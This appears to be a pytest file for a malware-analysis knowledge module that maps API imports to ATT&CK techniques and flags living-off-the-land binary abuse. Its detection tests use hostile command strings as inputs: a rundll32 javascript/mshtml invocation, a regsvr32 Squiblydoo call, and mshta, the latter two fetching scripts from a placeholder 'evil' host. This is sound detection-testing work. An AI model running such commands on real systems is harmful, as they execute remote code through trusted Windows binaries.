"""``maljan.tools.knowledge`` answers from the vendored tables, or says why not.

The two lookups backed by a vendored JSON file — the API-behaviour catalog and
the LOLBin table — are checked against real values. The three backed by an
index that needs the MITRE bundle or an embedding model are checked for the
contract that matters more than any value: a backend that is not there yields
an empty result and a ``reason``, and never an exception. That is what stops a
missing model turning "we could not look" into "we looked and found nothing".
"""

from __future__ import annotations

import json
import threading
import time
from collections.abc import Iterator
from pathlib import Path
from typing import Any

import pytest

from maljan.tools import knowledge

_ELF_IMPORTS: dict[str, dict[str, list[str]]] = json.loads(
    (Path(__file__).resolve().parents[2] / "fixtures" / "elf_import_lists.json").read_text(
        encoding="utf-8"
    )
)


class TestApiCapability:
    def test_a_catalogued_api_reports_its_behaviour_category(self) -> None:
        result = knowledge.api_capability(["WriteProcessMemory", "CreateRemoteThread"])

        by_api = {row["api"]: row for row in result["capabilities"]}
        assert by_api["WriteProcessMemory"]["category"] == "process_injection"
        assert by_api["WriteProcessMemory"]["catalog_flags"] == ["suspicious"]
        assert by_api["CreateRemoteThread"]["behaviours"] == ["process_injection"]

    def test_an_api_the_catalog_does_not_know_comes_back_empty_not_guessed_at(self) -> None:
        result = knowledge.api_capability(["ZzNotARealWin32Api"])
        row = result["capabilities"][0]
        assert row["category"] is None
        assert row["behaviours"] == []
        assert row["techniques"] == []
        assert row["catalog_flags"] == []

    def test_the_catalog_label_names_its_source_rather_than_reading_as_a_verdict(self) -> None:
        """A bare ``suspicious: true`` would be this tool passing judgement.
        ``catalog_flags`` says whose judgement it is."""
        row = knowledge.api_capability(["WriteProcessMemory"])["capabilities"][0]
        assert "suspicious" not in row
        assert row["catalog_flags"] == ["suspicious"]

    def test_a_missing_catalog_is_named_rather_than_silently_empty(self) -> None:
        result = knowledge.api_capability(["WriteProcessMemory"], behaviour_map="data/nope.json")
        assert "has no windows categories" in result["reason"]

    def test_an_empty_list_is_an_empty_answer(self) -> None:
        assert knowledge.api_capability([]) == {"capabilities": [], "platform": "windows"}

    def test_a_rule_fires_over_the_whole_set_and_each_api_it_matched_cites_it(self) -> None:
        """Every rule in the vendored map needs two or more APIs. Matched one
        name at a time no rule can fire, which is how the pack's entry came to
        list no technique on any sample; the set is matched once."""
        result = knowledge.api_capability(
            ["VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread", "RegQueryValueExA"]
        )
        by_api = {row["api"]: row for row in result["capabilities"]}
        cited = by_api["WriteProcessMemory"]["techniques"]
        assert [c["technique_id"] for c in cited] == ["T1055"]
        assert set(cited[0]["matched"]) >= {"WriteProcessMemory", "CreateRemoteThread"}
        assert len(cited[0]["matched"]) >= cited[0]["min_apis"]
        assert by_api["CreateRemoteThread"]["techniques"][0]["technique_id"] == "T1055"
        # An API the rule did not match does not carry it.
        assert by_api["RegQueryValueExA"]["techniques"] == []

    def test_one_api_alone_clears_no_rule(self) -> None:
        row = knowledge.api_capability(["WriteProcessMemory"])["capabilities"][0]
        assert row["techniques"] == []


# The GDI and message-pump calls a Win32 program makes to put a window on the
# screen and read its events. Nothing here is evidence of anything; a signed
# SSH client imports every one of them.
_A_GUI_PROGRAM_IMPORTS = [
    "BitBlt",
    "CreateCompatibleBitmap",
    "CreateCompatibleDC",
    "GetDC",
    "GetDIBits",
    "SelectObject",
    "GetMessageA",
    "PeekMessageA",
    "DispatchMessageA",
    "TranslateMessage",
]


class TestDrawingAWindowIsNotKeylogging:
    """The catalogue called the GDI blit calls keylogging and tiered them high.

    On a signed SSH client that made sixteen imports read as suspicious, and
    the one analyst that spoke cited the entry behind a Malware verdict. The
    calls stay in the catalogue and keep their ATT&CK association — screen
    capture really is what a screenshot is made of — but the association is
    not a finding, and the catalogue now says what would turn it into one.
    """

    def test_the_gdi_capture_calls_are_catalogued_as_screen_capture(self) -> None:
        rows = knowledge.api_capability(
            ["BitBlt", "CreateCompatibleBitmap", "CreateCompatibleDC", "GetDC", "GetDIBits"]
        )["capabilities"]
        assert {row["category"] for row in rows} == {"screen_capture"}

    def test_the_screen_capture_group_flags_nothing_on_its_own(self) -> None:
        rows = knowledge.api_capability(["BitBlt", "GetDC", "GetDIBits"])["capabilities"]
        assert all(row["catalog_flags"] == [] for row in rows)

    def test_the_group_names_what_would_corroborate_it(self) -> None:
        row = knowledge.api_capability(["BitBlt"])["capabilities"][0]
        assert row["corroborated_by"]
        assert "SetWindowsHookExA" in row["corroborated_by"]
        assert "GetRawInputData" in row["corroborated_by"]
        assert "GetClipboardData" in row["corroborated_by"]

    def test_a_named_corroborator_is_still_catalogued_as_keylogging(self) -> None:
        row = knowledge.api_capability(["GetAsyncKeyState"])["capabilities"][0]
        assert row["category"] == "keylogging"
        assert row["catalog_flags"] == ["suspicious"]

    def test_the_association_survives_the_relabelling(self) -> None:
        """T1113 is what these calls are for; it is shown, never asserted."""
        rows = knowledge.api_capability(["BitBlt", "CreateCompatibleDC", "GetDC", "GetDIBits"])[
            "capabilities"
        ]
        cited = {t["technique_id"] for row in rows for t in row["techniques"]}
        assert "T1113" in cited

    def test_a_benign_gui_import_set_raises_no_flag_from_these_groups(self) -> None:
        rows = knowledge.api_capability(_A_GUI_PROGRAM_IMPORTS)["capabilities"]
        flagged = {row["api"]: row["category"] for row in rows if row["catalog_flags"]}
        assert flagged == {}

    def test_an_api_with_no_corroboration_list_does_not_carry_the_key(self) -> None:
        row = knowledge.api_capability(["WriteProcessMemory"])["capabilities"][0]
        assert "corroborated_by" not in row


class TestLolbinLookup:
    def test_a_scriptlet_rundll32_invocation_maps_to_its_technique(self) -> None:
        result = knowledge.lolbin_lookup(
            ['rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";alert(1)']
        )

        assert result["hits"] == [
            {
                "binary": "rundll32",
                "technique_id": "T1218.011",
                "pattern": 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";alert(1)',
            }
        ]

    def test_squiblydoo_regsvr32_maps_to_its_own_technique(self) -> None:
        result = knowledge.lolbin_lookup(["regsvr32 /s /u /i:http://evil/x.sct scrobj.dll"])
        assert result["hits"][0]["technique_id"] == "T1218.010"

    def test_the_benign_use_of_a_lolbin_is_not_a_hit(self) -> None:
        """Presence is not evidence: these binaries run on every Windows box
        every minute, and a table that flagged them all would flag nothing."""
        result = knowledge.lolbin_lookup(
            ["regsvr32 /s C:\\Windows\\System32\\legit.dll", "notepad.exe report.txt"]
        )
        assert result == {"hits": [], "checked": 2}

    def test_a_hit_carries_no_confidence_number(self) -> None:
        hit = knowledge.lolbin_lookup(["mshta http://evil/x.hta"])["hits"][0]
        assert set(hit) == {"binary", "technique_id", "pattern"}


class TestAttckLookup:
    def test_a_real_technique_is_valid_and_carries_its_domain_and_platforms(self) -> None:
        result = knowledge.attck_lookup("T1055")
        assert result["valid"] is True
        assert result["domain"] == "enterprise"
        assert result["technique_id"] == "T1055"
        assert result["url"].startswith("https://attack.mitre.org/techniques/T1055")

    def test_an_invented_technique_is_reported_invalid_rather_than_missing(self) -> None:
        result = knowledge.attck_lookup("T9999.001")
        assert result["valid"] is False
        assert result["technique_id"] == "T9999.001"

    def test_an_empty_id_says_what_was_wrong_with_the_call(self) -> None:
        result = knowledge.attck_lookup("")
        assert result["valid"] is False
        assert result["reason"] == "no technique id given"

    def test_a_lowercase_id_is_normalised_before_the_lookup(self) -> None:
        assert knowledge.attck_lookup("t1055")["technique_id"] == "T1055"


class TestWhatTheLookupAnswersAboutAnId:
    """The four fields the vendored table owns, pinned per domain.

    The table itself is checked against the bundles elsewhere; this is the
    tool's own output, which is what every consumer reads.
    """

    @pytest.mark.parametrize(
        ("technique_id", "name", "domain", "tactic", "platform"),
        [
            ("T1055", "Process Injection", "enterprise", "privilege-escalation", "Windows"),
            ("T1055.012", "Process Hollowing", "enterprise", "stealth", "Windows"),
            ("T1583", "Acquire Infrastructure", "enterprise", "resource-development", "PRE"),
            ("T1417", "Input Capture", "mobile", "credential-access", "Android"),
            ("T1633", "Virtualization/Sandbox Evasion", "mobile", "defense-evasion", "iOS"),
            ("T0800", "Activate Firmware Update Mode", "ics", "inhibit-response-function", None),
        ],
    )
    def test_the_catalogue_entry_is_what_the_table_says(
        self, technique_id: str, name: str, domain: str, tactic: str, platform: str | None
    ) -> None:
        answer = knowledge.attck_lookup(technique_id)
        assert answer["valid"] is True
        assert answer["name"] == name
        assert answer["domain"] == domain
        assert tactic in answer["tactics"]
        assert answer["url"] == (
            f"https://attack.mitre.org/techniques/{technique_id.replace('.', '/')}"
        )
        if platform is None:
            assert answer["platforms"] == []
        else:
            assert platform in answer["platforms"]

    def test_the_scope_the_two_tools_report_is_one_answer(self) -> None:
        for technique_id in ("T1055", "T1417", "T0800", "T1583"):
            lookup = knowledge.attck_lookup(technique_id)
            scope = knowledge.attck_scope(technique_id)
            assert (lookup["domain"], lookup["platforms"]) == (scope["domain"], scope["platforms"])

    def test_a_retired_id_is_named_as_retired_and_carries_no_entry(self) -> None:
        answer = knowledge.attck_lookup("T1562.001")
        assert answer["valid"] is False
        assert answer["retired_in"] == "19.2"
        assert (answer["name"], answer["tactics"], answer["platforms"]) == ("", [], [])


class TestAttckValidate:
    def test_only_the_invalid_ids_come_back(self) -> None:
        result = knowledge.attck_validate(["T1055", "T9999.001", "T1547.001"])
        assert [row["id"] for row in result["invalid"]] == ["T9999.001"]
        assert result["checked"] == 3

    def test_a_bogus_subtechnique_of_a_real_parent_suggests_the_parent(self) -> None:
        result = knowledge.attck_validate(["T1055.999"])
        row = result["invalid"][0]
        assert row["id"] == "T1055.999"
        # The suggestion needs the index; when it is unavailable the row says
        # so instead, and either answer is honest.
        assert "T1055" in row["suggestions"] or row.get("reason")

    def test_nothing_invalid_is_an_empty_list(self) -> None:
        assert knowledge.attck_validate(["T1055"])["invalid"] == []

    def test_an_empty_input_is_an_empty_answer(self) -> None:
        assert knowledge.attck_validate([]) == {"invalid": [], "checked": 0}


class TestDegradation:
    """A backend that is not there must never raise and never look like a miss."""

    @pytest.fixture(autouse=True)
    def _reset(self):
        knowledge.reset_indices()
        yield
        knowledge.reset_indices()

    def test_a_missing_family_catalog_answers_with_a_reason(self) -> None:
        result = knowledge.family_lookup("ransomware", catalog="data/no-such-catalog.json")
        assert result["families"] == []
        assert "no family fingerprint catalog" in result["reason"]

    def test_a_missing_case_corpus_answers_with_a_reason(self) -> None:
        result = knowledge.similar_cases("beaconing", corpus="data/no-such-corpus.json")
        assert result["cases"] == []
        assert result["techniques"] == []
        assert "no ATT&CK case corpus" in result["reason"]

    def test_an_embedding_backend_that_raises_becomes_a_reason(self, monkeypatch) -> None:
        def _explode(*args: Any, **kwargs: Any) -> Any:
            raise RuntimeError("no model on this box")

        monkeypatch.setattr("maljan.memory.family_fingerprint_index.load_family_index", _explode)
        result = knowledge.family_lookup("ransomware")
        assert result["families"] == []
        assert "could not be read" in result["reason"]

    def test_an_unreachable_attck_index_leaves_resolve_technique_empty_with_a_reason(
        self, monkeypatch
    ) -> None:
        import time

        monkeypatch.setattr(knowledge, "_HYBRID_FAILED", "the ATT&CK index is unavailable: offline")
        monkeypatch.setattr(knowledge, "_HYBRID_FAILED_AT", time.monotonic())
        result = knowledge.resolve_technique("process injection")
        assert result["candidates"] == []
        assert "unavailable" in result["reason"]

    def test_the_index_failure_is_remembered_rather_than_retried_per_call(
        self, monkeypatch
    ) -> None:
        """A box that cannot reach MITRE would otherwise re-attempt a
        fifty-megabyte download on every single lookup."""
        attempts: list[int] = []

        class _Broken:
            @classmethod
            def from_loader(cls) -> Any:
                attempts.append(1)
                raise RuntimeError("offline")

        monkeypatch.setattr("maljan.memory.hybrid_attck_index.HybridATTCKIndex", _Broken)

        for _ in range(3):
            knowledge.resolve_technique("process injection")

        assert len(attempts) == 1


class TestAFailedIndexBuildIsRetried:
    """One network blip used to cost a worker its index for the life of the
    process: every later job in it ran without the hybrid index, and nothing
    said why. The failure is now believed for an interval and no longer."""

    @pytest.fixture(autouse=True)
    def _cold(self) -> Iterator[None]:
        knowledge.reset_indices()
        knowledge.set_index_retry_after(900)
        yield
        knowledge.reset_indices()
        knowledge.set_index_retry_after(900)

    @staticmethod
    def _broken(attempts: list[int]) -> Any:
        class _Broken:
            @classmethod
            def from_loader(cls) -> Any:
                attempts.append(1)
                raise RuntimeError("offline")

        return _Broken

    def test_the_next_lookup_after_the_interval_attempts_another_build(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        attempts: list[int] = []
        monkeypatch.setattr(
            "maljan.memory.hybrid_attck_index.HybridATTCKIndex", self._broken(attempts)
        )
        knowledge.set_index_retry_after(60)

        knowledge.resolve_technique("process injection")
        knowledge.resolve_technique("process injection")
        assert len(attempts) == 1

        # The clock, not the lookup count, is what opens the door.
        monkeypatch.setattr(knowledge, "_HYBRID_FAILED_AT", time.monotonic() - 61)
        answer = knowledge.resolve_technique("process injection")
        assert len(attempts) == 2
        assert "unavailable" in answer["reason"]

    def test_a_retry_that_succeeds_clears_the_reason(self, monkeypatch: pytest.MonkeyPatch) -> None:
        attempts: list[int] = []
        monkeypatch.setattr(
            "maljan.memory.hybrid_attck_index.HybridATTCKIndex", self._broken(attempts)
        )
        knowledge.set_index_retry_after(60)
        knowledge.resolve_technique("process injection")
        assert not knowledge.index_is_warm()

        class _Working:
            @classmethod
            def from_loader(cls) -> Any:
                return _Working()

            @staticmethod
            def search(_text: str, top_k: int = 5) -> list[Any]:
                return []

        monkeypatch.setattr("maljan.memory.hybrid_attck_index.HybridATTCKIndex", _Working)
        monkeypatch.setattr(knowledge, "_HYBRID_FAILED_AT", time.monotonic() - 61)
        assert knowledge.resolve_technique("process injection") == {"candidates": []}
        assert knowledge.index_is_warm()

    def test_an_interval_of_zero_is_the_old_behaviour(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        attempts: list[int] = []
        monkeypatch.setattr(
            "maljan.memory.hybrid_attck_index.HybridATTCKIndex", self._broken(attempts)
        )
        knowledge.set_index_retry_after(0)
        knowledge.resolve_technique("process injection")
        monkeypatch.setattr(knowledge, "_HYBRID_FAILED_AT", time.monotonic() - 86400)
        knowledge.resolve_technique("process injection")
        assert len(attempts) == 1

    def test_lookups_arriving_together_start_one_build(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """No retry storm: the attempt is claimed under the lock, so the
        callers that arrive while a slow build runs are answered the standing
        reason rather than starting builds of their own."""
        attempts: list[int] = []
        started = threading.Barrier(4)

        class _Slow:
            @classmethod
            def from_loader(cls) -> Any:
                attempts.append(1)
                time.sleep(0.2)
                raise RuntimeError("offline")

        monkeypatch.setattr("maljan.memory.hybrid_attck_index.HybridATTCKIndex", _Slow)
        knowledge.set_index_retry_after(60)
        knowledge.resolve_technique("process injection")
        assert len(attempts) == 1
        monkeypatch.setattr(knowledge, "_HYBRID_FAILED_AT", time.monotonic() - 61)

        def _ask() -> None:
            started.wait(timeout=5)
            knowledge.resolve_technique("process injection")

        threads = [threading.Thread(target=_ask) for _ in range(4)]
        for thread in threads:
            thread.start()
        for thread in threads:
            thread.join(timeout=10)
        assert len(attempts) == 2

    def test_the_background_warmer_arms_again_once_the_failure_is_stale(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        attempts: list[int] = []
        monkeypatch.setattr(
            "maljan.memory.hybrid_attck_index.HybridATTCKIndex", self._broken(attempts)
        )
        knowledge.set_index_retry_after(60)
        assert knowledge.warm_index_in_background() is True
        for _ in range(200):
            if knowledge._HYBRID_FAILED:
                break
            time.sleep(0.02)
        assert attempts == [1]
        assert knowledge.warm_index_in_background() is False

        monkeypatch.setattr(knowledge, "_HYBRID_FAILED_AT", time.monotonic() - 61)
        assert knowledge.warm_index_in_background() is True

    def test_a_qdrant_free_box_reports_the_missing_client_rather_than_no_matches(
        self, monkeypatch
    ) -> None:
        from maljan.memory.function_hash_store import FunctionHashStoreUnavailableError

        def _explode(**kwargs: Any) -> Any:
            raise FunctionHashStoreUnavailableError("qdrant-client is required")

        monkeypatch.setattr("maljan.memory.function_hash_store.FunctionHashStore", _explode)
        result = knowledge.function_matches(["deadbeef"], qdrant_url="http://localhost:6333")
        assert result["matches"] == []
        assert "qdrant-client" in result["reason"]

    def test_no_hashes_to_look_up_is_an_empty_answer_without_touching_qdrant(self) -> None:
        assert knowledge.function_matches([], qdrant_url="http://unreachable:6333") == {
            "matches": []
        }


class TestTheCitationIsTheSameInEveryProcess:
    _NAMES = ["RegCreateKeyExA", "RegCreateKeyExW", "RegSetValueExA", "RegSetValueExW"]

    def _run(self, seed: str) -> dict:
        import json
        import os
        import subprocess
        import sys

        code = (
            "import json; from maljan.tools import knowledge; "
            f"print(json.dumps(knowledge.api_capability({self._NAMES!r})))"
        )
        env = {**os.environ, "PYTHONHASHSEED": seed}
        out = subprocess.run(
            [sys.executable, "-c", code], capture_output=True, text=True, env=env, check=True
        ).stdout
        return json.loads(out.strip().splitlines()[-1])

    def test_two_hash_seeds_cite_the_same_apis(self) -> None:
        """Set iteration order changes with the seed; the record must not."""
        first, second = self._run("1"), self._run("5")
        assert first == second
        cited = {row["api"]: row["techniques"] for row in first["capabilities"]}
        for name in self._NAMES:
            assert cited[name], f"{name} cites nothing"
        # Both spellings of a pair cite the rule, with the same matched list.
        assert cited["RegCreateKeyExA"] == cited["RegCreateKeyExW"]


class TestTheLinuxVocabulary:
    """An ELF's dynamic symbols are asked of the catalogue's Linux block. The
    two blocks share names, so the platform is what keeps a libc symbol from
    being answered about Win32."""

    @pytest.fixture(autouse=True)
    def _fresh_catalogues(self) -> Iterator[None]:
        from maljan.analysis import api_capability_db

        api_capability_db.reset_cache()
        yield
        api_capability_db.reset_cache()

    def test_a_libc_symbol_reports_its_linux_category(self) -> None:
        result = knowledge.api_capability(["ptrace", "process_vm_writev"], platform="linux")
        by_api = {row["api"]: row for row in result["capabilities"]}
        assert result["platform"] == "linux"
        assert by_api["ptrace"]["category"] == "anti_debug"
        assert by_api["process_vm_writev"]["category"] == "process_injection"

    def test_the_pair_clears_the_ptrace_rule_and_cites_the_symbols_it_matched(self) -> None:
        result = knowledge.api_capability(["ptrace", "process_vm_writev"], platform="linux")
        hits = [hit for row in result["capabilities"] for hit in row["techniques"]]
        assert {hit["technique_id"] for hit in hits} == {"T1055.008"}
        # The row says what the pair is the mechanism of and who else uses it,
        # so it cannot be read as an accusation on its own.
        assert hits[0]["rule"] == "attaching to another process and reading or writing its memory"
        assert "debugger" in hits[0]["ordinary_use"]

    def test_a_windows_rule_cannot_fire_on_an_elf_s_symbols(self) -> None:
        """``socket``, ``connect``, ``send`` and ``recv`` are in both blocks.

        The Windows half pins what that block does today rather than endorsing
        it: the same four names clear its Non-Application Layer Protocol rule,
        which the Linux block deliberately does not have. Raising that bar is
        its own change, against Windows evidence this branch does not carry.
        """
        names = ["socket", "connect", "send", "recv"]
        linux = knowledge.api_capability(names, platform="linux")
        assert [row["category"] for row in linux["capabilities"]] == ["network"] * 4
        assert [hit for row in linux["capabilities"] for hit in row["techniques"]] == []
        windows = knowledge.api_capability(names, platform="windows")
        cleared = {
            hit["technique_id"] for row in windows["capabilities"] for hit in row["techniques"]
        }
        assert "T1095" in cleared

    def test_the_catalogue_says_nothing_about_ordinary_linux_tools(self) -> None:
        """Real import lists, not a list picked to pass. Every one of these is
        a program a Linux system ships and runs; the catalogue may describe
        what they touch and may not label any of it."""
        checked = 0
        for tool, names in _ELF_IMPORTS["benign"].items():
            result = knowledge.api_capability(names, platform="linux")
            flagged = [row["api"] for row in result["capabilities"] if row["catalog_flags"]]
            cleared = sorted(
                {hit["technique_id"] for row in result["capabilities"] for hit in row["techniques"]}
            )
            assert flagged == [], f"{tool} carries {len(flagged)} labelled rows"
            assert cleared == [], f"{tool} clears {cleared}"
            checked += 1
        assert checked >= 8

    def test_an_ordinary_tool_still_gets_its_associations(self) -> None:
        """Saying nothing is not the same as answering nothing: the rows are
        there, they carry categories, and the ones that mean little alone name
        what would give them weight."""
        result = knowledge.api_capability(_ELF_IMPORTS["benign"]["su"], platform="linux")
        rows = {row["api"]: row for row in result["capabilities"]}
        assert rows["setuid"]["category"] == "privilege"
        assert rows["setuid"]["catalog_flags"] == []
        assert "ptrace" in rows["setuid"]["corroborated_by"]

    # A canonical Mirai shape: sockets, a fork, a signal, a process rename, a
    # walk of /proc, a file removed, an ioctl. No ``ptrace`` and no
    # ``memfd_create``, because that family uses neither. Every symbol is one
    # the ELF really imports; nothing here was chosen to clear a rule.
    MIRAI_SHAPE = (
        "__libc_start_main",
        "atoi",
        "chdir",
        "close",
        "closedir",
        "connect",
        "execve",
        "fcntl",
        "fork",
        "getpid",
        "ioctl",
        "kill",
        "memcpy",
        "open",
        "opendir",
        "prctl",
        "read",
        "readdir",
        "recv",
        "select",
        "send",
        "setsid",
        "setsockopt",
        "signal",
        "socket",
        "strlen",
        "system",
        "unlink",
        "write",
    )

    def test_a_canonical_bot_shape_produces_categories_and_no_technique_row(self) -> None:
        """What the block does and does not say about a bot that traces nothing.

        Written down as an assertion rather than as prose in the test beside
        this one, which uses a list carrying the exact symbols the surviving
        rules are written on. Measured on this machine, every combination of
        behaviour groups a Mirai shape has appears on at least 6 % of an
        ordinary system's binaries, and every narrower symbol combination it
        has either does the same or is carried by ``coreutils`` in the benign
        fixture — so no rule and no labelled combination for this shape clears
        the block's own bar, and the honest answer is the categories alone.
        """
        result = knowledge.api_capability(list(self.MIRAI_SHAPE), platform="linux")
        rows = result["capabilities"]

        assert {row["category"] for row in rows if row["category"]} == {
            "network",
            "process",
            "execution",
            "filesystem",
            "discovery",
        }
        assert [row["api"] for row in rows if row["catalog_flags"]] == []
        assert [hit for row in rows for hit in row["techniques"]] == []

    def test_every_linux_rule_says_what_it_is_and_who_else_does_it(self) -> None:
        """A rule with no mechanism and no ordinary user reads as an accusation."""
        from maljan.analysis.api_capability_db import load_api_attck_map
        from maljan.tools.knowledge import DEFAULT_API_ATTCK_MAP, resolve_data

        table = load_api_attck_map(str(resolve_data(DEFAULT_API_ATTCK_MAP)), "linux")

        assert table is not None
        assert table.techniques
        for rule in table.techniques:
            assert rule.rule, rule.technique_id
            assert rule.ordinary_use, rule.technique_id

    def test_a_bot_shaped_import_list_still_produces_associations(self) -> None:
        """The other half of the bar: a catalogue that says nothing about
        anything is no catalogue.

        Read for what it is. The list carries the exact symbols the surviving
        rules are written on, so the rules clearing is arithmetic rather than
        evidence that the block would catch an arbitrary bot — the canonical
        Mirai shape above, which traces nothing and executes no anonymous
        file, produces associations and no technique row at all. What this
        pins is that the categories still describe a sample's shape after the
        tiering was taken almost entirely off, and that the two rules fire
        when their own evidence is present.
        """
        bot = [
            "__libc_start_main",
            "close",
            "connect",
            "execve",
            "fexecve",
            "fork",
            "getpid",
            "kill",
            "memfd_create",
            "memcpy",
            "open",
            "personality",
            "prctl",
            "ptrace",
            "read",
            "recv",
            "select",
            "send",
            "setsid",
            "socket",
            "strlen",
            "system",
            "unlink",
            "write",
        ]
        result = knowledge.api_capability(bot, platform="linux")
        rows = {row["api"]: row for row in result["capabilities"]}
        assert {rows[n]["category"] for n in ("socket", "execve", "ptrace", "memfd_create")} == {
            "network",
            "execution",
            "anti_debug",
            "process_injection",
        }
        cleared = sorted(
            {hit["technique_id"] for row in result["capabilities"] for hit in row["techniques"]}
        )
        assert cleared == ["T1620"]

    def test_the_label_waits_for_what_would_give_it_weight(self) -> None:
        """An anonymous file on its own is ordinary in the graphics and service
        stacks; the same call beside one that reaches into another process is
        not, and only then does the catalogue label the row."""
        alone = knowledge.api_capability(["memfd_create"], platform="linux")
        (row,) = alone["capabilities"]
        assert row["category"] == "process_injection"
        assert row["catalog_flags"] == []
        assert "ptrace" in row["flagged_with"]

        beside = knowledge.api_capability(["memfd_create", "ptrace"], platform="linux")
        labelled = {r["api"]: r["catalog_flags"] for r in beside["capabilities"]}
        assert labelled["memfd_create"] == ["suspicious"]

    def test_the_windows_block_is_labelled_by_its_tier_as_before(self) -> None:
        """The gate is data the Windows block does not carry, so nothing there
        waits for a second name."""
        result = knowledge.api_capability(["WriteProcessMemory"], platform="windows")
        (row,) = result["capabilities"]
        assert row["catalog_flags"] == ["suspicious"]
        assert "flagged_with" not in row

    def test_a_platform_the_catalogue_has_no_block_for_says_so(self) -> None:
        result = knowledge.api_capability(["open"], platform="plan9")
        assert result["platform"] == "plan9"
        assert result["capabilities"][0]["category"] is None
        assert "no plan9 categories" in result["reason"]
